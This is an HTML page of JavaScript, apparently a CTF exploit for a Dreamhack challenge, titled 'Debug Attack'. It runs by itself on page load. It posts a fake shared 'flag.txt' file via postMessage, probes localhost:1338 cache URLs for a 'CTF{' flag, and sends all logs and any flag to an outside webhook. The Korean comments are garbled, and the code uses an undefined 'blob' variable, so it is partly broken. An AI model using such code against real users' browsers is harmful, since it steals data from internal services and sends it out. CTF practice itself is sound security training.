<!DOCTYPE html>
<html>
<head>
    <title>Debug Attack</title>
</head>
<body>
    <h1>ğŸ” Debug Attack Page</h1>
    <div id="status">Loading...</div>
    <div id="log"></div>

    <script>
        function log(msg) {
            const div = document.createElement('div');
            div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
            document.getElementById('log').appendChild(div);
            console.log(msg);
            
            // ì›¹í›…ìœ¼ë¡œë„ ë¡œê·¸ ì „ì†¡
            try {
                fetch('https://cnbyzgj.request.dreamhack.games', {
                    method: 'POST',
                    body: `LOG: ${msg}`
                }).catch(() => {});
            } catch (e) {}
        }

        function updateStatus(msg) {
            document.getElementById('status').innerHTML = msg;
            log(msg);
        }

        async function simpleAttack() {
            try {
                updateStatus("ğŸš€ Attack started");

                // 1. ìš°ì„  ê°„ë‹¨í•œ postMessageë§Œ ì‹œë„
                updateStatus("ğŸ“¤ Adding cached files...");
                

                        
                window.postMessage({
                    type: "share",
                    files: [{
                        blob: blob,
                        cached: true,
                        name: "flag.txt",
                    }],
                }, "*");
                        


                updateStatus("â³ Waiting 3 seconds...");
                await new Promise(resolve => setTimeout(resolve, 3000));


                // 3. Cache íŒŒì¼ë“¤ ì‹œë„ (ê°„ë‹¨í•˜ê²Œ)
                updateStatus("ğŸ“ Trying cache files...");
                
                for (let i = 1; i <= 5; i++) {
                    try {
                        log(`Trying cache=${i}`);
                        
                        const response = await fetch(`http://localhost:1338/?cache=${i}`, {
                            mode: 'no-cors'
                        });
                        
                        log(`Cache ${i}: response received`);
                        
                        if (response.type !== 'opaque') {
                            const content = await response.text();
                            log(`Cache ${i} content: ${content}`);
                            
                            if (content.includes('CTF{')) {
                                log(`ğŸš© POTENTIAL FLAG: ${content}`);
                                updateStatus(`ğŸš© FLAG FOUND: ${content}`);
                                
                                // ì›¹í›…ìœ¼ë¡œ ì „ì†¡
                                await fetch('https://cnbyzgj.request.dreamhack.games', {
                                    method: 'POST',
                                    body: `FLAG FOUND: ${content}`
                                });
                            }
                        }
                    } catch (e) {
                        log(`Cache ${i} error: ${e.message}`);
                    }
                }

                updateStatus("âœ… Attack completed");

            } catch (error) {
                log(`ğŸ’¥ Main error: ${error.message}`);
                updateStatus(`âŒ Error: ${error.message}`);
            }
        }

        // ì¦‰ì‹œ ì‹œì‘ (íƒ€ì´ë¨¸ ì—†ì´)
        window.onload = function() {
            log("ğŸ¯ Page loaded - starting attack immediately");
            simpleAttack();
        };

        // ì¶”ê°€ ë””ë²„ê¹…: ëª¨ë“  ì—ëŸ¬ ìºì¹˜
        window.onerror = function(msg, url, line, col, error) {
            log(`ğŸ’¥ Global error: ${msg} at ${line}:${col}`);
            return false;
        };

        // Promise rejection ìºì¹˜
        window.addEventListener('unhandledrejection', function(event) {
            log(`ğŸ’¥ Unhandled promise rejection: ${event.reason}`);
        });
    </script>
</body>
</html>
